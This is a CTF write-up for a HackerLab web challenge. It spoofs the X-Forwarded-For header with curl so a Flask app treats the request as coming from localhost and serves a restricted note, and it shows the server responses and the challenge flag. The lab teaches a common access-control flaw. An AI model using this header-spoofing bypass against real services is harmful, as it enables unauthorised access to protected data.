---
title: "Notes service"
slug: hackerlab-notes-service
excerpt: "X-Forwarded-For header bypass for localhost restriction"
coverImage: "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800"
coverImageAlt: "HackerLab Notes Service - CTF writeup"
categories:
  - HackerLab
  - Web
  - HTTP Headers
  - Access Control
date: 2025-01-08
---

> "I store all the most important things in my notes."

We are provided with an IP address and a specific endpoint to a note: `/note/27`. The goal is to access this note, which presumably contains the flag.

## Reconnaissance

Attempting to access the URL `http://62.173.140.174:16096/note/27` directly results in a **403 Forbidden** error.

```html
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/3.1.3 Python/3.11.6
...
<div class="card">
    <p>Oops! You don't have permission to view this note.</p>
    <p>Maybe there is a secret way around this?</p>
</div>
```

The server identifies itself as **Werkzeug/Python** (Flask). The error message "Maybe there is a secret way around this?" combined with an "Easy" difficulty rating often suggests a restriction based on the client's identity or location.

## Vulnerability: IP Restriction Bypass

In web applications, developers often restrict administrative or private endpoints to internal traffic (localhost) for security. However, if the application determines the client's IP address using HTTP headers like `X-Forwarded-For` without proper validation, an attacker can spoof their IP.

The `X-Forwarded-For` header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. If we manually inject this header, we can trick the server into believing the request is originating from the server itself (`127.0.0.1`).

## Exploitation

We use `curl` to send a GET request to the restricted endpoint while injecting the `X-Forwarded-For` header set to localhost.

```bash
curl -H "X-Forwarded-For: 127.0.0.1" \
     -v http://62.173.140.174:16096/note/27
```

The server accepts the spoofed IP and returns a **200 OK** response containing the secret note.

### Server Response

```html
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.6
Content-Type: text/html; charset=utf-8

...
<div class="card">
    <pre>Congratulations! You've found the secret note.

Here is your flag:

CODEBY{byp4ss_4o3_err0r}
</pre>
</div>
```

## Flag

```
CODEBY{byp4ss_4o3_err0r}
```
